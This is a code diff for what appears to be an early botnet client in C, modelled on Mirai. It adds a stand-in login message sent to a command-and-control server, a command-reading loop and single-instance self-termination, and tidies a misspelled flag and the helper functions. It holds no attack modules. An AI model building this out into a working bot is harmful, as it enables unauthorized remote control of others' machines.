@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <unistd.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -8,6 +9,7 @@
 #include <time.h>
 #include <errno.h>
 #include <signal.h>
+#include <string.h>
 
 
 #include "includes.h"
@@ -21,11 +23,14 @@
 
 static void ensure_single_instance(void);
 static void establish_connection(void);
+static void close_connection_CNC(void);
+static void close_connection_local(void);
 
 struct sockaddr_in srv_addr;
 static int fd_ctrl = -1, fd_serv = -1;
-static BOOL neet_setup_connection = FALSE;
+static BOOL need_setup_connection = FALSE;
 static BOOL bind_OK = FALSE;
+
 
 int main(int argc, char **args)
 {
@@ -53,7 +58,7 @@ int main(int argc, char **args)
 	}
 
 	/*
-	while(!neet_setup_connection)
+	while(!need_setup_connection)
 	{
 		establish_connection();
 		sleep(3);	
@@ -99,7 +104,7 @@ int main(int argc, char **args)
 		/* in the first select, we assume that the connection has not been established
 		 * so we add fd_serv to fdwrite
 		 */
-		if (neet_setup_connection)
+		if (need_setup_connection)
 		{
 			FD_SET(fd_serv, &fdwrite);	
 		}
@@ -141,70 +146,76 @@ int main(int argc, char **args)
 			}
 			continue;
 		}
-		else
+		/* when fd_ctrl receives a new client's connection request, it kill itself
+		 * becaseus: in ensure_signal_instance(), when I failed to  bind the local address, I will try to connect to it 
+		 */ 	
+		if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdread))
 		{
-			/* when fd_ctrl receives a new client's connection request, it kill itself
-			 * becaseus: in ensure_signal_instance(), when I failed to  bind the local address, I will try to connect to it 
-			 */ 	
-			if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdread))
-			{
-				//kill itself here
-				struct sockaddr_in new_addr;
-				socklen_t new_addr_len = sizeof(struct sockaddr_in);
-				accept(fd_ctrl, (struct sockaddr*)&new_addr, &new_addr_len);
+			//kill itself here
+			struct sockaddr_in new_addr;
+			socklen_t new_addr_len = sizeof(struct sockaddr_in);
+			accept(fd_ctrl, (struct sockaddr*)&new_addr, &new_addr_len);
 
+			close_connection_CNC();
+			close_connection_local();
+
+			printf("[main]A new instance appear, try to kill myselfi\n");
+
+			//exit
+			kill(getpid(), SIGKILL); exit(0);
+		}
+
+		//check if the connection is established successfully
+		if (need_setup_connection)
+		{
+			//in the second select, fd_serv will be added into fdread;
+			need_setup_connection = FALSE;
+
+			//connection failed
+			if (fd_serv != -1 && !FD_ISSET(fd_serv, &fdwrite))
+			{
 				close_connection_CNC();
-				close_connection_local();
-
-				printf("[main]A new instance appear, try to kill myselfi\n");
-
-				//exit
-				kill(getpid(), SIGKILL);
-				exit 0;
 			}
-
-			//check if the connection is established successfully
-			if (neet_setup_connection)
+			else
 			{
-				//in the second select, fd_serv will be added into fdread;
-				neet_setup_connection = FALSE;
-
-				//connection failed
-				if (fd_serv != -1 && FD_ISSET(fd_serv, &fdwrite))
+				//Detect if there is an error
+				int err = 0;
+				socklen_t err_len = sizeof(err);
+				getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
+				if (err != 0)
 				{
-					close_connection_CNC();
+					close_connection_CNC();	
 				}
 				else
 				{
-					//Detect if there is an error
-					int err = 0;
-					socklen_t err_len = sizeof(err);
-					getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
-					if (err != 0)
-					{
-						close_connection_CNC();	
-					}
-					else
-					{
-						//send login information
-						
-					}
+					int buf[BUFSIZ];
+					memcpy(buf, "hello,world", 12);
+					//send login information
+					printf("[main]send login information here\n");						
+					write(fd_serv, buf, sizeof(buf));
+					printf("[main]Connection CNC success\n");						
 				}
 			}
-			//if the connection is already established, accept the server command
-			else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdread))
-			{
-				/* try to read data from fd_serv
-				 * readn > 0	//Normal connection
-				 * readn == 0	//connection closed
-				 * readn < 0	//An error occurred
-				 */
-			}
+		}
+		//if the connection is already established, accept the server command
+		else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdread))
+		{
+			/* try to read data from fd_serv
+			 * readn > 0	//Normal connection
+			 * readn == 0	//connection closed
+			 * readn < 0	//An error occurred
+			 */
+			printf("[main]Receive command here\n");
+			char readbuf[BUFSIZ];
+			read(fd_serv, readbuf, sizeof(readbuf));
+			printf("[main]Data: %s\n", readbuf);
 		}
 	}
 	
 	return 0;
 }
+
+
 
 static void establish_connection()
 {
@@ -212,12 +223,12 @@ static void establish_connection()
 	fd_serv = socket(AF_INET, SOCK_STREAM, 0);
 	if (fd_serv == -1)
 	{
-		neet_setup_connection = FALSE;
+		need_setup_connection = FALSE;
 		printf("create socket failed, errorno:%d\n", errno);	
 		return ;
 	}
 
-	neet_setup_connection = TRUE;
+	need_setup_connection = TRUE;
 	fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
 	connect(fd_serv, (struct sockaddr*)&srv_addr, sizeof(struct sockaddr_in));
 
@@ -227,35 +238,17 @@ static void establish_connection()
 	MAKESURE_CONNECTION:
 		if (ret == -1)
 		{
-			neet_setup_connection = FALSE;	
+			need_setup_connection = FALSE;	
 			close(fd_serv);
 			printf("[main]Failed to connect to CNC. errno:%d\n", errno);
 		}
 		else
 		{
-			neet_setup_connection = TRUE;	
+			need_setup_connection = TRUE;	
 			printf("[main]Connect to CNC success.\n");
 		}
  */
 	return ;
-}
-
-static void close_connect_CNC(void)
-{
-	if (fd_serv != -1)
-	{
-		close(fd_serv);
-	}
-	fd_serv = -1;
-}
-
-static void close_connect_local(void)
-{
-	if (fd_ctrl != -1)
-	{
-		close(fd_ctrl);
-	}
-	fd_ctrl = -1;
 }
 
 static void ensure_single_instance(void)
@@ -327,4 +320,22 @@ static void ensure_single_instance(void)
 
 	return ;
 
+}
+
+static void close_connection_CNC(void)
+{
+	if (fd_serv != -1)
+	{
+		close(fd_serv);
+	}
+	fd_serv = -1;
+}
+
+static void close_connection_local(void)
+{
+	if (fd_ctrl != -1)
+	{
+		close(fd_ctrl);
+	}
+	fd_ctrl = -1;
 }
